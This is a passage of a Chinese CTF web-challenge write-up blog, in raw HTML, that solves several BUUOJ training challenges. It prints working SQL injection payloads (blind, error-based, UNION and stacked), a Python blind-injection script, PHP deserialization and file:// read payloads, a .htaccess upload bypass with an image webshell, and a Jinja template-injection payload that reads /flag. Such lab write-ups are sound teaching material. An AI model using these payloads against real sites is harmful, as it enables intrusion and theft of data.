class=\"line\">//O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在传入对象之前当然要把读取文件流改为正常包含文件了。最终payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"CISCN2019-华北赛区-Day2-Web1-Hack-World\"><a href=\"#CISCN2019-华北赛区-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day2 Web1]Hack World\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307171921.png\"></p>\n<p>很明显的sql注入，随便尝试一些语句有</p>\n<blockquote>\n<p>1    &gt;&gt;    Hello, glzjin wants a girlfriend.</p>\n<p>2    &gt;&gt;    Do you want to be my girlfriend?</p>\n<p>3之后都是    &gt;&gt;    Error Occured When Fetch Result.</p>\n</blockquote>\n<p>输入一个单引号<code>1&#39;</code>出现了<code>bool(false)</code>，是一个布尔类型返回，就很有可能是盲注之类的。测试的时候还发现空格被过滤了，空格被过滤可以尝试使用TAB制表符代替。</p>\n<p>题目中也有提示</p>\n<blockquote>\n<h3 id=\"All-You-Want-Is-In-Table-‘flag’-and-the-column-is-‘flag’\"><a href=\"#All-You-Want-Is-In-Table-‘flag’-and-the-column-is-‘flag’\" class=\"headerlink\" title=\"All You Want Is In Table ‘flag’ and the column is ‘flag’\"></a>All You Want Is In Table ‘flag’ and the column is ‘flag’</h3></blockquote>\n<p>说明flag在flag表的flag字段中。以下是一个布尔盲注的脚本，思路就是查询flag的值使用<code>substr</code>函数每次截取一个字符，获得其<code>ascii</code>值再使用二分法确定具体的值，最后拼接输出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/&#x27;</span></span><br><span class=\"line\">result = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">50</span>):</span><br><span class=\"line\">\thigh = <span class=\"number\">127</span></span><br><span class=\"line\">\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> high&gt;low:</span><br><span class=\"line\">\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select\tflag\tfrom\tflag),%d,1))&gt;%d,1,2)&quot;</span> % (x, mid)</span><br><span class=\"line\">\t\tdata = &#123;</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;id&quot;</span>:payload</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ttime.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">\t\tresponse = requests.post(url, data = data)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;Hello&#x27;</span> <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">\t\t\tlow=mid+<span class=\"number\">1</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\thigh = mid</span><br><span class=\"line\">\t\tmid = (low+high)/<span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tresult += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(mid))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(result)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;929c8993-2d85-4fbf-8e48-7c457551105e&#125;</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"极客大挑战-2019-HardSQL\"><a href=\"#极客大挑战-2019-HardSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]HardSQL\"></a>[极客大挑战 2019]HardSQL</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307173126.png\"></p>\n<p>还是sql注入题。尝试在输入框里输入<code>#</code>、<code>--+</code>时被拦下了，但是在url中使用%23通过了。尝试了union但是被过滤了，使用双写也不通过，和这道题同类型的题前面有Baby SQL、Easy SQL，考点还剩下的有盲注、报错注入、堆叠注入。尝试报错注入可以使用，我参考的<a href=\"https://www.cnblogs.com/wocalieshenmegui/p/5917967.html\">十种MySQL报错注入</a>。还需要注意空格是会被拦下的，url编码也不能通过，所以在语句中的表名需要使用<code>()</code>隔开，具体payload如下：</p>\n<ol>\n<li>爆表</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"keyword\">or</span>(extractvalue(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span>(group_concat(table_name))<span class=\"keyword\">from</span>(information_schema.tables)<span class=\"keyword\">where</span>(table_schema)<span class=\"keyword\">like</span>(database())),<span class=\"number\">0x7e</span>)))<span class=\"operator\">%</span><span class=\"number\">23</span><span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>当前表名是：H4rDsq1</p>\n<ol start=\"2\">\n<li>爆字段</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"keyword\">or</span>(extractvalue(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span>(group_concat(column_name))<span class=\"keyword\">from</span>(information_schema.columns)<span class=\"keyword\">where</span>(table_name)<span class=\"keyword\">like</span>(<span class=\"string\">&#x27;H4rDsq1&#x27;</span>)),<span class=\"number\">0x7e</span>)))<span class=\"operator\">%</span><span class=\"number\">23</span><span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>当前表的字段有：id,username,password</p>\n<ol>\n<li>出数据</li>\n</ol>\n<p>如果使用正常的查询语句会因为flag的长度太长，页面中的回显长度不能显示全，但是可以使用<code>left</code>和<code>right</code>函数：</p>\n<blockquote>\n<p>语法：LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH)</p>\n</blockquote>\n<p>这两个函数会用到选取的长度，如果想要拼成一个完整的flag，可以先用length查看总长度，计算以后拼一下</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"keyword\">or</span>(extractvalue(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span>(<span class=\"keyword\">left</span>(password,<span class=\"number\">35</span>))<span class=\"keyword\">from</span>(H4rDsq1)),<span class=\"number\">0x7e</span>)))<span class=\"operator\">%</span><span class=\"number\">23</span><span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>flag{112bb5db-17a4-47e2-97b4-19</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"keyword\">or</span>(extractvalue(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span>(<span class=\"keyword\">right</span>(password,<span class=\"number\">11</span>))<span class=\"keyword\">from</span>(H4rDsq1)),<span class=\"number\">0x7e</span>)))<span class=\"operator\">%</span><span class=\"number\">23</span><span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>dc295a017f}</p>\n<hr>\n<h1 id=\"网鼎杯-2018-Fakebook\"><a href=\"#网鼎杯-2018-Fakebook\" class=\"headerlink\" title=\"[网鼎杯 2018]Fakebook\"></a>[网鼎杯 2018]Fakebook</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307174819.png\"></p>\n<p>是一个展示自己博客网址的列表，先随便注册一个</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307175313.png\"></p>\n<p>我填的是baidu的网址23333。这时的url是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1</span><br></pre></td></tr></table></figure>\n\n<p>看到了no=1，应该想到了sql注入，我没有试出什么名堂，但是在网上找到了一个这道题的非预期解：[<a href=\"https://www.cnblogs.com/kevinbruce656/p/12643338.html\">网鼎杯2018]fakebook题解</a>，使用了<code>load_file</code>函数直接读取了flag文件。同样是空格被过滤，但是可以使用<code>/**/</code>绕过。</p>\n<h2 id=\"非预期解\"><a href=\"#非预期解\" class=\"headerlink\" title=\"非预期解\"></a>非预期解</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>\n\n<p>先使用上面的语句查看回显点。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307180356.png\"></p>\n<p>找的了位置2的回显点，可以把函数替换在2的位置上。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>\n\n<p>参考师傅的博客中是使用了盲注获得flag的，其实执行以后使用页面的选取工具选取回显的标签块，可以在注释里找的到🤣</p>\n<h2 id=\"预期解\"><a href=\"#预期解\" class=\"headerlink\" title=\"预期解\"></a>预期解</h2><p>正常的sql注入一套查询，同样是使用<code>/**/</code>绕过空格过滤。</p>\n<p>爆表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23</span><br></pre></td></tr></table></figure>\n\n<p>爆字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27; %23</span><br></pre></td></tr></table></figure>\n\n<p>出数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users</span><br></pre></td></tr></table></figure>\n\n<p>查询的结果是一大串字符串，但是在结尾一个PHP的序列化对象：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;guobang&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:20:&quot;http://www.baidu.com&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>说明网站是使用反序列化获取对应栏的数据，下面有一个iframe的标签，根据提示<strong>the contents of his/her blog</strong>，得知我们提供的网址会在这里显示，正好有一个php伪协议file://可以读取本地文件，思路就是：<strong>使用伪协议读取flag作为blog网站回显在iframe的标签中</strong>，所以构造一个序列化对象。 </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span> = <span class=\"string\">&quot;guobang&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$age</span> = <span class=\"number\">18</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$blog</span> = <span class=\"string\">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$s</span> = <span class=\"keyword\">new</span> UserInfo();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$s</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;guobang&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>最终payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1%20union/***/select%201,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;guobang&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27; from%20users</span><br></pre></td></tr></table></figure>\n\n<p>在iframe里面找，是一个data:text/html的数据格式，base64加密的噢。</p>\n<hr>\n<h1 id=\"网鼎杯-2020-青龙组-AreUSerialz\"><a href=\"#网鼎杯-2020-青龙组-AreUSerialz\" class=\"headerlink\" title=\"[网鼎杯 2020 青龙组]AreUSerialz\"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>部分图</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308102316.png\"></p>\n<p>最下面有对于payload的限制：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_valid</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; strlen(<span class=\"variable\">$s</span>); <span class=\"variable\">$i</span>++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!(ord(<span class=\"variable\">$s</span>[<span class=\"variable\">$i</span>]) &gt;= <span class=\"number\">32</span> &amp;&amp; ord(<span class=\"variable\">$s</span>[<span class=\"variable\">$i</span>]) &lt;= <span class=\"number\">125</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>&#123;<span class=\"string\">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$str</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;str&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(is_valid(<span class=\"variable\">$str</span>)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$obj</span> = unserialize(<span class=\"variable\">$str</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要payload中的字符ascii码值<code>大于</code>32<code>小于</code>125。注意到最后有一个<code>unserialize</code>函数，判断这道题考点是反序列化。接下来分析源码：</p>\n<ul>\n<li><code>process()</code>函数判断op的值，如果是<code>1</code>就写入文件，如果是<code>2</code>就读取文件。代码开头包含了<code>flag.php</code>文件，所以推测需要使用2操作数读取flag.php文件。</li>\n<li><code>write()</code>把对象中的<code>$content</code>属性值写入到<code>$filename</code>文件中，如果长度大于100会被拦下。</li>\n<li><code>read()</code>使用<strong>file_get_contents()<strong>函数读取文件。</strong>正是我们想要的</strong>。</li>\n<li><code>output()</code>输出内容。</li>\n<li><code>__destruct()</code>对象销毁时会执行的函数，需要注意的是<strong>if</strong>判断里的<code>$this-&gt;op === &quot;2&quot;</code>是强比较，并且会修改op的值为1（写文件），因为**”2”<strong>是一个字符串类型的如果传入</strong>整型的2**即可绕过。</li>\n</ul>\n<p>所以我们构造一个对象<strong>op</strong>为2，<strong>filename</strong>为flag.php即可，读文件的时候肯定不是</p>\n<p>接下来是反序列化时会遇到的问题，因为对象中属性的修饰是<code>protected</code>，序列化时需要保证一致的。</p>\n<p>先给出自己创建的对象源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileHandler</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span>  <span class=\"variable\">$op</span>=<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span>  <span class=\"variable\">$filename</span>=<span class=\"string\">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span>  <span class=\"variable\">$content</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"keyword\">new</span> FileHandler();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$c</span>);</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>PHP7.1以上版本对属性类型不敏感、用public绕过:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行以后可以在网页注释中找到文件。绝对路径读取也可以，我第一次使用php://filter读再去解码也成功了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>序列化字符串中s替换为S，支持字符串用16进制，</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;S:22:&quot;/var/www/html/flag.php&quot;;S:10:&quot;\\00*\\00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>思路：<a href=\"https://blog.csdn.net/Oavinci/article/details/106998738\">https://blog.csdn.net/Oavinci/article/details/106998738</a></p>\n<hr>\n<h1 id=\"MRCTF2020-你传你🐎呢\"><a href=\"#MRCTF2020-你传你🐎呢\" class=\"headerlink\" title=\"[MRCTF2020]你传你🐎呢\"></a>[MRCTF2020]你传你🐎呢</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308104930.png\"></p>\n<p>测试后缀，php、phtml都被过滤了，htaccess可以，先传上特供的<code>.htaccess</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105247.png\"></p>\n<p>传图片马，我一直用的是GIF马，几次尝试都没通过，后来修改了<code>Content-Type: image/jpeg</code>可以了，说明Content-Type是GIF还不行，接下来直接传图片码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105652.png\"></p>\n<p>根据地址访问图片马的地址，使用system读文件还没成，用蚁剑连了执行执行ret=127,disable_function了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110126.png\"></p>\n<p>不过根目录下的flag文件还是可以正常读取，至于disable_function可以参考<a href=\"https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/\">【极客大挑战 2019】RCE ME</a>。</p>\n<hr>\n<h1 id=\"BJDCTF-2nd-fake-google\"><a href=\"#BJDCTF-2nd-fake-google\" class=\"headerlink\" title=\"[BJDCTF 2nd]fake google\"></a>[BJDCTF 2nd]fake google</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110510.png\"></p>\n<p>就一个输入框，随便输入一个去看看，跳转以后</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110545.png\"></p>\n<p>注释里有提示ssti，应该是模板注入，就在网上搜一个ssti的payload试试<a href=\"https://blog.csdn.net/qq_40657585/article/details/83657220\">SSTI (服务器模板注入)</a></p>\n<p>找到了一个直接读文件的payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110717.png\"></p>\n<hr>\n<h1 id=\"GYCTF2020-Blacklist\"><a href=\"#GYCTF2020-Blacklist\" class=\"headerlink\" title=\"[GYCTF2020]Blacklist\"></a>[GYCTF2020]Blacklist</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110821.png\"></p>\n<p>sql注入，先试一试堆叠注入，可以执行，尝试select的时候返回了过滤内容</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> preg_match(<span class=\"string\">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;</span>,<span class=\"variable\">$inject</span>);</span><br></pre></td></tr></table></figure>\n\n<p>前面还有一个堆叠注入的是新姿势**[强网杯 2019]随便注**，一种是使用prepare预处理语句，另一种是修改表名，根据上面的过滤内容，两种方法都被过滤了。先试试查看表：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-1</span><span class=\"string\">&#x27;;show tables;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">FlagHere</span></span><br><span class=\"line\"><span class=\"string\">words</span></span><br></pre></td></tr></table></figure>\n\n<p>查看表结构：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-1</span><span class=\"string\">&#x27;;desc `FlagHere`;</span></span><br></pre></td></tr></table></figure>\n\n<p>接下来是看的wp，学到了个新姿势：使用<code>HANDLER ... OPEN</code>语句，贴一个<a href=\"https://dev.mysql.com/doc/refman/8.0/en/handler.html\">官方文档</a>。</p>\n<p><code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-1</span><span class=\"string\">&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308111414.png\"></p>\n<hr>\n<h1 id=\"强网杯-2019-高明的黑客\"><a href=\"#强网杯-2019-高明的黑客\" class=\"headerlink\" title=\"[强网杯 2019]高明的黑客\"></a>[强网杯 2019]高明的黑客</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308112326.png\"></p>\n<p>下载源码以后一堆不可读的源码，但是里面有很多shell，看不懂所以找了wp，思路就是用脚本匹配文件中的shell，然后传参试一试每一个shell是否能用，抄脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span 